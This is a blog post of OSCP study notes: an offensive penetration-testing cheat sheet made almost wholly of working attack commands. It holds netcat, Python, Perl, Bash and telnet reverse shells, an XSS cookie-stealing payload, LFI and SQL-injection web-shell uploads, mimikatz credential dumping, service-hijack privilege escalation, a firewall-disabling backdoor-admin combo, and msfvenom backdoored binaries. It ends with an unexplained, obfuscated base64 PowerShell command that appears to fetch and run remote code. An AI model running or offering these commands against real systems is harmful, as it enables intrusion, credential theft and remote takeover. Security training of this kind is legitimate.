---
layout: post
title: "OSCP Notes"
date: 2022-10-11
categories: []
tags: [OSCP, Pentesting, Notes]
---


<b>This is a mixture of my notes and other notes that I have gathered on my OSCP path.</b> 


<b>Extract link from html page:</b>

	cat index.html | grep "href=" | cut -d "/" -f3| grep "<[DOMAIN]>" | cut -d '"' -f1 | sort -u

# Netcat
<b>Interact with application:</b>

	nc -nv <[IP]> <[PORT]>

<b>Listener:</b>

	nc -nlvp <[PORT]>

<b>File transfer (client):</b>

	nc -nlvp <[PORT]> > <[FILE]>

<b>File transfer (server):</b>

	nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>

# Bind vs Reverse Shell

<b>Bind Shell:</b>

Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:

	(User 1): nc -nlvp <[PORT]> -e cmd.exe

	(User 2): nc -nv <[BOB_IP]> <[PORT]>

<b>Reverse Shell:</b>

Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:

	(User 1): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash

	(User 2): nc -nlvp <[PORT]>

# Zone Transfer

	dnsrecon -t axfr -d <[DOMAIN]>
	
# Nmap
	nmap -sS -sV -A -O --script="*-vuln-*" --script-args=unsafe=1 <[IP]>

# SMB

	nbtscan <[SUBNET]>

	nmap -p139,445 --script smb-enum-users <[SUBNET]>

	nmap -p139,445 --script=smb-vuln-* --script-args=unsafe=1 <[SUBNET]>

	enum4linux

	smbclient -L <[IP]> -N

	smbclient \\<[IP]>\share -N

# SMTP

	nmap -p25 <[SUBNET]> --open

	nc -nv IP 25

	VRFY <[USERNAME]>

# SNMP

<b>Steps: nmap scan udp 161, create target IP list, create community list file, use onesixtyone + snmpwalk</b>

	nmap -sU --open -p161 <[SUBNET]> --open

	onesixtyone -c community -i <[SMNP_IP_LIST]>

	snmpwalk -c public -v1 <[IP]> <mib-values>

<b>Mib-values (for snmpwalk):</b>

	1.3.6.1.2.1.25.1.6.0 System Processes

	1.3.6.1.2.1.25.4.2.1.2 Running Programs

	1.3.6.1.2.1.25.4.2.1.4 Processes Path

	1.3.6.1.2.1.25.2.3.1.4 Storage Units

	1.3.6.1.2.1.25.6.3.1.2 Software Name

	1.3.6.1.4.1.77.1.2.25 User

	1.3.6.1.2.1.6.13.1.3 TCP Local Ports
	
# File Transfer Linux

<b>Netcat:</b>

	On Victim machine (client):

	nc -nlvp 4444 > <[FILE]>

	On Attacker machine (server):

	nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>

<b>Curl:</b>

	curl -O http://<[IP]>/<[FILE]>
	
<b>Wget:</b>

	wget http://<[IP]>/<[FILE]>
	
<b>Recursive wget ftp download:</b>

	wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
	
# File Transfer Windows

<b>TFTP</b> (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.)

	On attacker machine:
	
	mkdir tftp
	
	atftpd --deamon --port 69 tftp
	
	cp <[FILE]> tftp
	
	On victim machine shell:
	
	tftp -i <[IP]> GET <[FILE]>
	
<b>FTP</b> (Windows operating systems contain a default FTP client that can also be used for file transfer)

On attacker machine:

	(UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
	
	(UNA TANTUM) Create new user for PureFTPD (see script setup-ftp.sh) (USER demo, PASS demo1234)
	
		groupadd ftgroup

		useradd -g ftpgroup -d /dev/null -s /etc ftpuser

		pure-pw useradd demo -u ftpuser -d /ftphome

		pure-pw mkdb

		cd /etc/pure-ftpd/auth

		ln -s ../conf/PureDB 60pdb

		mkdir -p /ftphome

		chown -R ftpuser:ftpgroup /ftphome
	
		/etc/init.d/pure-ftpd restart
	
	(UNA TANTUM) chmod 755 setup-ftp.sh
	
On victim machine shell:

	echo open <[IP]> 21 > ftp.txt
	
	echo USER demo >> ftp.txt
	
	echo ftp >> ftp.txt
	
	echo bin >> ftp.txt
	
	echo GET nc.exe >> ftp.txt
	
	echo bye >> ftp.txt
	
	ftp -v -n -s:ftp.txt
	
#AD Time

If you have a high priv user account use mimikatz:

<b>FIRST CHECK FOR USERS</b>

	`net users /domain'
	
	

	`privilege::debug`

	`token::elevate`

	`sekurlsa::logonpasswords`

	`lsadump::lsa /inject`

	`lsadump::sam`
	
	`lsadump::lsa /patch`

	`lsadump::dcsync /user:xxx`
	
#WADComs (https://wadcoms.github.io/)

<b>Top things to check</b>

	python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
	
	python3 psexec.py test.local/john:password123@10.10.10.1
	
	python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
	
	python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
	
	<b>evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP</b>
	
	enum4linux -a 10.10.10.1
	
	smbclient -L \\test.local -I 10.10.10.1 -N
	
	python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m "Remote Desktop Users" -C -r
	
	
	
	
<b>Powershell</b> (In Windows 7, 2008 and above)

On victim machine shell:

	echo $storageDir = $pwd > wget.ps1
	
	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
	
	echo $url = "http://<[IP]>/<[FILE]>" >> wget.ps1
	
	echo $file = "evil.exe" >> wget.ps1
	
	echo $webclient.DownloadFile($url,$file) >> wget.ps1
	
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	
<b>Debug.exe utility</b> (In Windows 32bit OS - Works only for file < 64Kb)

On attacker machine:

	cp <[FILE]> .

	upx -9 <[FILE]> (for compression)
	
	cp /usr/share/windows-binaries/exe2bat.exe .
	
	wine exe2bat <[FILE]> <[FILE.txt]>

On victim machine:

	Paste the content of <[FILE.txt]>
	
# XSS

<b>Stole cookie from xss:</b>
	
	On attacker machine set listener (nc -nlvp <[PORT]>)
	
	On victim website <script>new Image().src="http://<[IP]>:<[PORT]>/test.php?output="+document.cookie;</script>

# LFI/RFI

	Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send <?php echo shell_exec($_GET['cmd']);?>, after that try to include log file for code execution.

	&cmd=nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
	
# SQL Injection

<b>Bse:</b>

	any' or 1=1 limit 1;-- 

<b>Number of columns:</b>
	
	order by 1, order by 2, ...

<b>Expose data from database:</b>
	
	UNION select 1,2,3,4,5,6

<b>Enum tables:</b>

	UNION select 1,2,3,4,table_name,6 FROM information_schema.tables

<b>Shell upload:</b>

	<[IP]>:<[PORT]>/<[URL]>.php?<[PARAMETER]>=999 union select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4,5,6 into OUTFILE '/var/www/html/evil.php'

# Buffer Overflow

	/usr/share/metasploit-framework/tools/pattern_create.rb <[LENGTH]>

	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -<[ADDRESS]>

# Privilege Escalation

<b>Vulnerable Services</b>

	accesschk.exe -uwcqv "Authenticated Users" * /accepteula
	
	sc qc <[VULNERABLE_SERVICE]>
	
	sc config <[VULNERABLE_SERVICE]> obj= ".\LocalSystem" password= ""
	
	sc config <[VULNERABLE_SERVICE]> start= "auto"
	
	sc config <[VULNERABLE_SERVICE]> binpath= "net user hacker Hacker123 /add"
	
	sc stop <[VULNERABLE_SERVICE]>
	
	sc start <[VULNERABLE_SERVICE]>
	
	sc config <[VULNERABLE_SERVICE]> binpath= "net localgroup administrator hacker /add"
	
	sc stop <[VULNERABLE_SERVICE]>
	
	sc start <[VULNERABLE_SERVICE]>
	
	sc config <[VULNERABLE_SERVICE]> binpath= "net localgroup \"Remote Desktop Users\" hacker /add"
	
	sc stop <[VULNERABLE_SERVICE]>
	
	sc start <[VULNERABLE_SERVICE]>

<b>Win10:</b>

	reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f 

	Then ctrl+alt+canc and start virtual keyboard

# Pass the hash

	Export SMBHASH=<[HASH]>
	
	pth-winexe -U administrator% //<[IP]> cmd
	
# Cracking

<b>Medusa</b>

	medusa -h 10.11.1.227 -U lab-users.txt -P lab-passwords.txt -M ftp | grep "ACCOUNT FOUND"

<b>Ncrack</b> (FTP, SSH, TELNET, HTTP(S), POP3(S), SMB, RDP, VNC)

	ncrack -U <[USERS_LIST]> -P <[PASSWORDS_LIST]> ftp://<[IP]>
	
# Firewall

<b>Enable Remote Desktop:</b>

	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

	netsh firewall set service remotedesktop enable

<b>Enable Remote assistance:</b>

	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

	netsh firewall set service remoteadmin enable

<b>Disable firewall:</b>

	netsh firewall set opmode disable

<b>One shot ninja combo (New Admin User, Firewall Off + RDP):</b>

	set CMD "net user hacker Hacker123 /add & net localgroup administrators hacker /add & net localgroup \"Remote Desktop Users\" 	hacker /add & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall set opmode disable"

# Backdooring EXE Files

	msfvenom -a x86 -x <[FILE]> -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.88 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o <[FILE_NAME]>

# Binaries payloads

<b>Linux:</b>
	
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f elf > <[FILE_NAME.elf]>

<b>Windows:</b>

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f exe > <[FILE_NAME.exe]>

<b>Mac</b>
	
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f macho > <[FILE_NAME.macho]>

# Web payloads

<b>PHP:</b>

	msfvenom -p php/meterpreter_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.php]>
	cat <[FILE_NAME.php]> | pbcopy && echo '<?php ' | tr -d '\n' > <[FILE_NAME.php]> && pbpaste >> <[FILE_NAME.php]>

<b>ASP:</b>
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f asp > <[FILE_NAME.asp]>

<b>JSP:</b>
	
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.jsp]>

<b>WAR:</b>

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f war > <[FILE_NAME.war]>
	
# Scripting Payloads

<b>Python:</b>

	msfvenom -p cmd/unix/reverse_python LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.py]>

<b>Bash:</b>

	msfvenom -p cmd/unix/reverse_bash LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.sh]>

<b>Perl</b>

	msfvenom -p cmd/unix/reverse_perl LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.pl]>

# Shellcode
For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

<b>Linux Based Shellcode:</b>

	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

<b>Windows Based Shellcode:</b>

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

<b>Mac Based Shellcode:</b>
	
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

# Staged vs Non-Staged Payloads

<b>Staged payload:</b> (useful for bof) (need multi_handler metasploit in order to works)

	Windows/shell/reverse_tcp
	
	msfvenom -a x86 -p linux/x86/shell/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_STAGED]>

<b>Non-staged:</b> (ok with netcat listener)

	Windows/shell_reverse_tcp
	
	msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_NON_STAGED]>

# Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

	use exploit/multi/handler
	
	set PAYLOAD <[PAYLOAD_NAME]>
	
	set LHOST <[IP]>
	
	set LPORT <[PORT]>
	
	set ExitOnSession false
	
	exploit -j -z

# Shell Spawning

<b>Python:</b>

	python -c 'import pty; pty.spawn("/bin/sh")'
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
	
<b>Bash:</b>
	
	echo os.system('/bin/bash')
	
	/bin/sh -i
	
	exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
	
<b>Perl:</b>
	
	perl —e 'exec "/bin/sh";'
	
	perl: exec "/bin/sh";
	
	perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

<b>Telnet:</b>

	mknod /tmp/yyy p && /bin/bash 0</tmp/yyy | telnet <[IP]> <[PORT]> 1>/tmp/yyy
	
<b>Ruby:</b>
	
	ruby: exec "/bin/sh"
	
<b>Lua:</b>
	
	lua: os.execute('/bin/sh')

<b>From within IRB:</b>
	
	exec "/bin/sh"
	
<B>From within vi:</B>
	
	:!bash
	
<B>From within vi:</B>

	:set shell=/bin/bash:shell
	
<B>From within nmap:</B>
	
	!sh    powershell -e JABzAD0AJwAxADAALgAyAC4AMwAyAC4ANQA3ADoAMQA3ADcAMQAnADsAJABpAD0AJwBkAGMAYwBiADUAOQBiADEALQAzAGYAYgBmADIAOQAyADEALQAyADEANwA5ADkANwBmADQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZABjAGMAYgA1ADkAYgAxACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAMwAwAGYALQAzAGQAZAA2ACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADMAZgBiAGYAMgA5ADIAMQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBlADMAMABmAC0AMwBkAGQANgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwAyADEANwA5ADkANwBmADQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBlADMAMABmAC0AMwBkAGQANgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
